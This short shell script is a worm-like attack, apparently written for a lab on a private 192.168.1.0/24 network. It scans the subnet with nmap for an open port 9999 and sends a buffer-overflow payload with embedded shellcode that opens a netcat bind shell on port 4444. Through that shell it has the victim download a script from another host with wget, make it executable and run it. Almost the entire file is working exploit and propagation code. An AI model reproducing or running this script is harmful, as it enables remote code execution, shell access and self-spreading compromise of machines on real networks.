#!/bin/sh

/bin/ps | grep "nc" | grep -v "grep" | awk '{print $1}' | xargs kill;

number=$(nmap 192.168.1.0/24 | grep "up" | wc -l)
number=$((number-3))

#Scan
a=0


while [ $a -eq 0 ]
do
	cnt=0
	IP=1

	while [ $a -eq 0 ] && [ $cnt -le $number ]
	do
		echo $IP
        	cnt=$((cnt+1))
        	IP=$((IP+1))
        	var=$(nmap 192.168.1.$IP -p 9999 | grep "open")
        	if [ "$var" ]
        	then
                	#echo "192.168.1.$IP"
                	a=1
        	fi

	done

	#Attack
	#perl -e 'print "Hello Wolrd\n"' | nc 192.168.1.2 9999;

	if [ $a -ne 0 ]
	then


		perl -e 'print "\x90"x89 . "\x48\x31\xc0\x50\x48\x31\xff\x48\xc7\xc7\x2f\x2f\x6e\x63\x57\x48\xbf\x2f\x75\x73\x72\x2f\x62\x69\x6e\x57\x48\x8d\x3c\x24\x48\xc7\xc1\x34\x34\x2d\x6c\x48\xc1\xe9\x10\x51\x48\x8d\x0c\x24\x48\xc7\xc2\x34\x34\x2d\x70\x48\xc1\xea\x10\x52\x48\x8d\x14\x24\x50\x68\x34\x34\x34\x34\x48\x8d\x1c\x24\x48\xc7\xc6\x34\x34\x2d\x65\x48\xc1\xee\x10\x56\x48\x89\xe6\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x8d\x04\x24\x48\x31\xed\x55\x50\x56\x53\x52\x51\x57\x48\x8d\x34\x24\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05" . 
		"\xa9\xe7\xff\xff\xff\x7f" ' | nc 192.168.1.$IP 9999 &

		#process_id=`/bin/ps | grep "nc" | grep -v "grep" | awk '{print $1}'`
		/bin/ps | grep "nc" | grep -v "grep" | awk '{print $1}' | xargs kill;

		perl -e 'print "wget 192.168.1.2:8000/script.sh\n" . "chmod +x ./script.sh\n" . "./script.sh\n"' | nc 192.168.1.$IP 4444; 
 
 
	fi


done
